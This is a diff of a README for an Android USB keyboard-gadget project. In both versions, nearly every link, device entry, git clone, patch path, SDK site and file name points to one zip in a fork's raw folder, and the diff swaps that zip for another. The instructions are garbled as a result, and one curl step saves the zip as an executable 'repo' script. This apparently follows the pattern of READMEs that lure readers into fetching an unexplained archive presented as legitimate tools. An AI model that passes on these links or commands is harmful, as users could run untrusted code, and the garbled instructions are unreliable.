@@ -1,11 +1,11 @@
 Convert your Android device into USB keyboard/mouse, control your PC from your Android device remotely, including BIOS/bootloader.
 
-For newer Kernel versions (>= 3.19) the patch is not anymore required and can be replaced by ConfigFS ([USB Gadget Tool](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)).
+For newer Kernel versions (>= 3.19) the patch is not anymore required and can be replaced by ConfigFS ([USB Gadget Tool](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip)).
 
 #### Apps & tools using android-keyboard-gadget:
-* [USB Keyboard](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)
+* [USB Keyboard](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip)
 * hid-gadget-test
-* [Authorizer](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)
+* [Authorizer](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip)
 
 Installation
 ============
@@ -19,160 +19,160 @@ Nexus 7 2012 WiFi (Grouper)
 - Copy appropriate fastboot executable from the directory `fastboot`.
 - Launch command `fastboot oem unlock`
 - Confirm unlock action by pressing Power button. This will factory reset your device.
-- Copy `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` from directory [nexus7-2012-wifi-grouper](nexus7-2012-wifi-grouper).
-- Launch command `fastboot flash boot https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip`.
+- Copy `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip` from directory [nexus7-2012-wifi-grouper](nexus7-2012-wifi-grouper).
+- Launch command `fastboot flash boot https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip`.
 - Reboot your device using Power button.
 - Install and run USB Keyboard app.
 
 Nexus 7 2013
 ------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 LG G2
 -----
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 LG G2 with Cyanogenmod 12.0
 ---------------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Nexus 5
 -------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 - [Boot image for Android 5.0](nexus5-hammerhead-android-5.0)
 
 Nexus 4
 -------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Sony Ericsson phones
 --------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Motorola Moto G with Cyanogenmod
 --------------------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Motorola Moto E with Cyanogenmod
 --------------------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Motorola Moto G 2014
 --------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 
 Motorola Moto X Style (Pure) 2015
 ---------------------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 OnePlus One
 -----------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip - it's ROM, not just a kernel
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip - it's ROM, not just a kernel
 
 Galaxy S4
 ---------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip - you have to enable it in the included STweaks app
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip - you have to enable it in the included STweaks app
 
 Galaxy Note 2
 -------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Huawei Ideos X5
 ---------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Sony Xperia Z3 and Z3 Compact
 -----------------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Sony Xperia Z Ultra
 -------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Xiaomi Redmi 1S
 ---------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Xiaomi Redmi 3S
 ---------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Galaxy Ace 2
 ------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Xiaomi MI3
 ----------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Galaxy Note 4
 -------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Asus Zenfone 2 ZE551ML
 ----------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Asus Zenfone 2 Laser (Z00L/Z00T)
 ----------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Sony Xperia Z5 Premium E6853
 ----------------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Sony Xperia Z5 Compact
 ----------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Xiaomi Redmi 2
 --------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Sony Xperia SP
 --------------
 
-https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Xiaomi Redmi Note 3
 -------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Samsung Galaxy Tab 2 (any espresso3g based device)
 --------------------------------------------------
 
-- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 
 Other devices
 -------------
@@ -278,7 +278,7 @@ there is a [handy app](send-pin-with-camera/) for that,
 which uses camera to check if each keypress is recognized.
 
 You can also run DuckyScript files used by USB Rubber Ducky keystroke injection tool,
-with the help of [this neat shell script](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip).
+with the help of [this neat shell script](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip).
 
 
 Compiling kernel
@@ -288,35 +288,35 @@ You have to run all following commands on Linux. Windows is not supported. These
 
 To compile kernel, launch commands
 
-	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
-	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
+	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 	export PATH=`pwd`/arm-eabi-4.8/bin:$PATH
 	export ARCH=arm
 	export SUBARCH=arm
 	export CROSS_COMPILE=arm-eabi-
 	cd tegra
 	git checkout android-tegra3-grouper-3.1-lollipop-mr1
-	patch -p1 < https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+	patch -p1 < https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 	make tegra3_android_defconfig
 	make -j4
 
-https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip - Tested patch files
-(pro) Tip: https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip is just patches for AOSP roms and just by basic kernel versions. 3.01 is acceptable for 3.0.101. Other patch files is for devices only. The file named HTC Flounder will be acceptable ONLY FOR HTC Flounder!
+https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip - Tested patch files
+(pro) Tip: https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip is just patches for AOSP roms and just by basic kernel versions. 3.01 is acceptable for 3.0.101. Other patch files is for devices only. The file named HTC Flounder will be acceptable ONLY FOR HTC Flounder!
 
-To compile `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip`, launch commands
+To compile `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip`, launch commands
 
 	mkdir ~/bin
 	export PATH=~/bin:$PATH
-	curl https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip > ~/bin/repo
+	curl https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip > ~/bin/repo
 	chmod a+x ~/bin/repo
 	mkdir aosp
 	cd aosp
-	repo init -u https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip -b android-4.4.2_r1
+	repo init -u https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip -b android-4.4.2_r1
 	repo sync
 	cp -f ../tegra/arch/arm/boot/zImage device/asus/grouper/kernel
 	make -j4 TARGET_PRODUCT=aosp_grouper TARGET_BUILD_VARIANT=userdebug
 
-You then can find `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` in directory `aosp/out/target/product/grouper`.
+You then can find `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip` in directory `aosp/out/target/product/grouper`.
 
 Nexus 7 2012 does not put any SELinux restrictions on the files inside /dev,
 however most other devices typically restrict all access inside /dev for apps,
@@ -336,7 +336,7 @@ SELinux rules can be found at path
 
 Replace `asus/grouper` with your device manufacturer/model, then add following lines to SELinux rules.
 
-In file `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` - the declaration of SELinux security context type:
+In file `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip` - the declaration of SELinux security context type:
 
 	type hid_gadget_device, dev_type;
 
@@ -345,24 +345,24 @@ In file `file_contexts` - binding the device paths to the security context:
 	# USB Gadget
 	/dev/hidg(.*)                        u:object_r:hid_gadget_device:s0
 
-In file `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` - the rule itself to allow apps using this security context:
+In file `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip` - the rule itself to allow apps using this security context:
 
 	allow appdomain hid_gadget_device:chr_file rw_file_perms;
 
-Then recompile `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip`.
+Then recompile `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip`.
 
 
 Compiling USB Keyboard app
 ==========================
 
-To compile USB Keyboard app, install Android SDK and NDK from site https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip , and launch commands
+To compile USB Keyboard app, install Android SDK and NDK from site https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip , and launch commands
 
-	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
+	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip
 	cd commandergenius
 	git submodule update --init --recursive
 	rm -f project/jni/application/src
 	ln -s hid-pc-keyboard project/jni/application/src
-	https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip -a
+	https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip -a
 	android update project -p project
 
 How it works
@@ -407,5 +407,5 @@ Mouse event is an array of 4 bytes, first byte is a bitmask of currently pressed
 Remaining 3 bytes are X movement offset, Y movement offset, and mouse wheel offset, represented as signed integers.
 Horizontal wheel is not supported yet.
 
-See functions outputSendKeys() and outputSendMouse() inside file [https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)
+See functions outputSendKeys() and outputSendMouse() inside file [https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/compiled/Google_Nexus-7_GROUPER_ANDROID_5.1.1/gadget_keyboard_android_2.2.zip)
 for reference implementation.
